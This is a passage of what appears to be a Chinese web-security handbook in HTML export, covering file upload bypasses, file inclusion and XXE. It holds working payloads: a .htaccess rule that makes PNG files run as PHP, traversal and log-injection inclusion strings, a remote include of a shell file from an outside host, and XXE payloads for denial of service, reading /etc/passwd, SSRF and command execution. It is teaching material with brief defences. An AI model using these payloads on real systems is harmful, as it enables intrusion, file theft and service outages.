class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">__pycache__ \ __init__ .cpython-35.pyc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p>&nbsp;</p></li></ul><h2 id='48--文件上传'><span>4.8  文件上传</span></h2><h3 id='481--文件类型检测绕过'><span>4.8.1  文件类型检测绕过</span></h3><h4 id='更改请求绕过'><span>更改请求绕过</span></h4><blockquote><p><span>有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。</span></p></blockquote><h4 id='magic检测绕过'><span>Magic检测绕过</span></h4><blockquote><p><span>有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</span></p><figure><table><thead><tr><th style='text-align:center;' ><span>类型</span></th><th style='text-align:center;' ><span>二进制值</span></th></tr></thead><tbody><tr><td style='text-align:center;' ><span>JPG</span></td><td style='text-align:center;' ><span>FF D8 FF E0 00 10 4A 46 49 46</span></td></tr><tr><td style='text-align:center;' ><span>GIF</span></td><td style='text-align:center;' ><span>47 49 46 38 39 61</span></td></tr><tr><td style='text-align:center;' ><span>PNG</span></td><td style='text-align:center;' ><span>89 50 4E 47</span></td></tr><tr><td style='text-align:center;' ><span>TIF</span></td><td style='text-align:center;' ><span>49 49 2A 00</span></td></tr><tr><td style='text-align:center;' ><span>BMP</span></td><td style='text-align:center;' ><span>42 4D</span></td></tr></tbody></table></figure></blockquote><h4 id='后缀绕过'><span>后缀绕过</span></h4><blockquote><p><span>部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。</span></p><p><span>php 由于历史原因，部分解释器可能支持符合正则 /ph(p</span><span>[</span><span>2-7</span><span>]</span><span>?</span><span>|</span><span>t(ml)?)/ 的后缀，如 php / php5 / pht /</span></p><p><span>phtml / shtml / pwml / phtm 等可在禁止上传 php 文件时测试该类型。</span></p><p><span>jsp 引擎则可能会解析 jspx / jspf / jspa / jsw / jsv / jtml 等后缀，asp 支持 asa / asax / cer / cdx /</span></p><p><span>aspx / ascx / ashx / asmx / asp{80-90} 等后缀。</span></p><p><span>除了这些绕过，其他的后缀同样可能带来问题，如 vbs / asis / sh / reg / cgi / exe / dll / com / bat /</span></p><p><span>pl / cfc / cfm / ini 等。</span></p></blockquote><h4 id='系统命名绕过'><span>系统命名绕过</span></h4><blockquote><p><span>在 Windows 系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。也可尝试 index.php%20 ， index.php:1.jpg index.php::</span><span>$</span><span>DATA 等。在 Linux 系统中，可以尝试上传名为 index.php/. 或 ./aa/../ index.php/. 的文件</span></p></blockquote><h4 id='userini'><span>.user.ini</span></h4><blockquote><p><span>在 php 执行的过程中，除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（</span><span>$</span><span>_</span><span>SERVER</span><span>[</span>’<span>DOCUMENT_ROOT</span>’<span>]</span><span> 所指定的）。如果被执行的 PHP文件在 web 根目录之外，则只扫描该目录。.user.ini 中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用 .user.ini 加上非 php 后缀的文件构造一个 shell，比如 auto_prepend_file=01.gif 。</span></p></blockquote><h4 id='waf-绕过'><span>WAF 绕过</span></h4><blockquote><p><span>有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。</span></p><p><span>另外，Waf 和 Web 系统对 boundary 的处理不一致，可以使用错误的 boundary 来完成绕过。</span></p></blockquote><h4 id='竞争上传绕过'><span>竞争上传绕过</span></h4><blockquote><p><span>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell</span></p><p><span>的文件并尝试访问，多次之后即可获得 Shell。</span></p></blockquote><h3 id='482--攻击技巧'><span>4.8.2  攻击技巧</span></h3><h4 id='apache-重写-getshell'><span>Apache 重写 GetShell</span></h4><blockquote><p><span>Apache 可根据是否允许重定向考虑上传.htaccess内容为：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="apache"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="apache"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">AddType</span><span class="cm-variable"> application/x-httpd-php .png</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">php_flag</span><span class="cm-variable"> engine 1</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>就可以用 png 或者其他后缀的文件做 php 脚本了</span></p></blockquote><h4 id='软链接任意读文件'><span>软链接任意读文件</span></h4><blockquote><p><span>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件若服务器没有做好防护，可实现任意文件读取的效果</span></p></blockquote><h3 id='483--防护技巧'><span>4.8.3  防护技巧</span></h3><ul><li><span>使用白名单限制上传文件的类型</span></li><li><span>使用更严格的文件类型检查方式</span></li><li><span>限制 Web Server 对上传文件夹的解析</span></li></ul><h3 id='484--参考链接'><span>4.8.4  参考链接</span></h3><ul><li><a href='https://www.freebuf.com/articles/web/188464.html'><span>构造优质上传漏洞 Fuzz 字典</span></a></li></ul><p>&nbsp;</p><h2 id='49--文件包含'><span>4.9  文件包含</span></h2><h3 id='491--基础'><span>4.9.1  基础</span></h3><blockquote><p><span>常见的文件包含漏洞的形式为 </span><span>&lt;</span><span>?php include(</span><span>&quot;</span><span>inc/</span><span>&quot;</span><span> . </span><span>$</span><span>_</span><span>GET</span><span>[</span><span>&#39;</span><span>file</span><span>&#39;</span><span>]</span><span>); ?</span><span>&gt;</span></p><p><span>考虑常用的几种包含方式为</span></p></blockquote><ul><li><span>同目录包含 file=.htaccess</span></li><li><span>目录遍历 ?file=../../../../../../../../../var/lib/locate.db</span></li><li><span>日志注入 ?file=../../../../../../../../../var/log/apache/error.log</span></li><li><span>利用 /proc/self/environ</span></li></ul><blockquote><p><span>其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试</span></p></blockquote><h3 id='492--触发-sink'><span>4.9.2  触发 Sink</span></h3><ul><li><h5 id='php-2'><span>PHP</span></h5><ul><li><p><strong><span>include</span></strong></p><ul><li><span>在包含过程中出错会报错，不影响执行后续语句</span></li></ul></li><li><h5 id='includeonce'><span>include_once</span></h5><ul><li><span>仅包含一次</span></li></ul></li><li><h5 id='require'><span>require</span></h5><ul><li><span>在包含过程中出错，就会直接退出，不执行后续语句</span></li></ul></li><li><p><span>require_once</span></p></li></ul></li></ul><h3 id='493--绕过技巧'><span>4.9.3  绕过技巧</span></h3><blockquote><p><span>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</span></p></blockquote><h4 id='url-编码绕过'><span>url 编码绕过</span></h4><blockquote><p><span>如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过</span></p></blockquote><h4 id='特殊字符绕过'><span>特殊字符绕过</span></h4><ul><li><span>某些情况下，读文件支持使用 Shell 通配符，如 ? </span><span>*</span><span> 等</span></li><li><span>url 中使用 ? </span><span>#</span><span> 可能会影响 include 包含的结果</span></li><li><span>某些情况下，unicode 编码不同但是字形相近的字符有同一个效果</span></li></ul><h4 id='00-截断'><span>%00 截断</span></h4><blockquote><p><span>几乎是最常用的方法，条件是 magic_quotes_gpc 关闭，而且 php 版本小于 5.3.4。</span></p></blockquote><h4 id='长度截断'><span>长度截断</span></h4><blockquote><p><span>Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。</span></p><p><span>msdn 定义 #define MAX_PATH 260，其中第 260 个字符为字符串结尾的 </span><span>\</span><span>0 ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。</span></p><p><span>获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX</span></p><p><span>/root 得到 255</span></p><p><span>那么在长度有限的时候，././././ (n 个) 的形式就可以通过这个把路径爆掉在 php 代码包含中，这种绕过方式要求 php 版本 </span><span>&lt;</span><span> php 5.2.8</span></p></blockquote><h4 id='伪协议绕过'><span>伪协议绕过</span></h4><ul><li><span>远 程 包 含: 要 求 allow_url_fopen=On allow_url_include=On ，payload 为 ? file=</span><span>[</span><span>http</span><span>|</span><span>https</span><span>|</span><span>ftp</span><span>]</span><span>://websec.wordpress.com/shell.txt 的形式</span></li><li><span>PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求 allow_url_include=On ，payload为 ?file=php://input 的形式</span></li><li><span>Base64: 使用 Base64 伪协议读取文件，payload 为 ?file=php://filter/convert.base64-encode/ resource=index.php 的形式</span></li><li><span>data: 使用 data 伪协议读取文件，payload 为 ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=的形式，要求 allow_url_include=On</span></li></ul><h4 id='协议绕过'><span>协议绕过</span></h4><blockquote><p><span>allow_url_fopen 和 allow_url_include 主要是针对 http ftp 两种协议起作用，因此可以使用 SMB、 WebDav 协议等方式来绕过限制。</span></p></blockquote><h3 id='494--参考链接'><span>4.9.4  参考链接</span></h3><ul><li><a href='https://www.cdxy.me/?p=752'><span>Exploit with PHP Protocols</span></a></li><li><a href='https://highon.coffee/blog/lfi-cheat-sheet/'><span>lfi cheat sheet</span></a></li></ul><p>&nbsp;</p><h2 id='410--xxe'><span>4.10  XXE</span></h2><h3 id='4101--xml-基础'><span>4.10.1  XML 基础</span></h3><blockquote><p><span>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。XML 的语法规范由 DTD （Document Type Definition）来进行控制。</span></p></blockquote><h3 id='4102--基本语法'><span>4.10.2  基本语法</span></h3><blockquote><p><span>XML 文档在开头有 </span><span>&lt;</span><span>?xml version=</span><span>&quot;</span><span>1.0</span><span>&quot;</span><span> encoding=</span><span>&quot;</span><span>UTF-8</span><span>&quot;</span><span> standalone=</span><span>&quot;</span><span>yes</span><span>&quot;</span><span>?</span><span>&gt;</span><span> 的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。</span></p><p><span>除了可选的开头外，XML 语法主要有以下的特性：</span></p></blockquote><ul><li><span>所有 XML 元素都须有关闭标签</span></li><li><span>XML 标签对大小写敏感</span></li><li><span>XML 必须正确地嵌套</span></li><li><span>XML 文档必须有根元素</span></li><li><span>XML 的属性值需要加引号</span></li></ul><blockquote><p><span>另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。</span></p></blockquote><h3 id='4103--xxe'><span>4.10.3  XXE</span></h3><blockquote><p><span>当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。</span></p></blockquote><h3 id='4104--攻击方式'><span>4.10.4  攻击方式</span></h3><h4 id='拒绝服务攻击-1'><span>拒绝服务攻击</span></h4><blockquote><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!DOCTYPE data [</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!ELEMENT data (#ANY)&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!ENTITY a0 "dos" &gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">]&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">data</span><span class="cm-tag cm-bracket">&gt;</span><span class="cm-atom">&amp;a2;</span><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">data</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 159px;"></div><div class="CodeMirror-gutters" style="height: 159px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</span></p></blockquote><h4 id='文件读取-2'><span>文件读取</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="xml-dtd"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="xml-dtd"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>6</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?xml version="1.0"?&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!DOCTYPE</span> <span class="cm-tag">data</span> [</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!ELEMENT</span> <span class="cm-tag">data</span> (<span class="cm-atom">#ANY</span>)&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!ENTITY</span> <span class="cm-tag">file</span> <span class="cm-tag">SYSTEM</span> <span class="cm-string">"file:///etc/passwd"</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">]&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">&lt;data</span>&gt;<span class="cm-tag">&amp;file</span>;&lt;<span class="cm-tag">/data</span>&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 136px;"></div><div class="CodeMirror-gutters" style="height: 136px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='ssrf-1'><span>SSRF</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="xml-dtd"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="xml-dtd"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>5</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?xml version="1.0"?&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!DOCTYPE</span> <span class="cm-tag">data</span> <span class="cm-tag">SYSTEM</span> <span class="cm-string">"http://publicServer.com/"</span> [</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!ELEMENT</span> <span class="cm-tag">data</span> (<span class="cm-atom">#ANY</span>)&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">]&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">&lt;data</span>&gt;4&lt;<span class="cm-tag">/data</span>&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="height: 113px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='rce'><span>RCE</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="xml-dtd"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="xml-dtd"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>8</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?xml version="1.0"?&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!DOCTYPE</span> <span class="cm-tag">GVI</span> [ <span class="cm-keyword">&lt;!ELEMENT</span> <span class="cm-tag">foo</span> <span class="cm-tag">ANY</span> &gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">&lt;!ENTITY</span> <span class="cm-tag">xxe</span> <span class="cm-tag">SYSTEM</span> <span class="cm-string">"expect://id"</span> &gt;]&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">&lt;catalog</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">&lt;core</span> <span class="cm-tag">id</span>=<span class="cm-string">"test101"</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">&lt;description</span>&gt;<span class="cm-tag">&amp;xxe</span>;&lt;<span class="cm-tag">/description</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 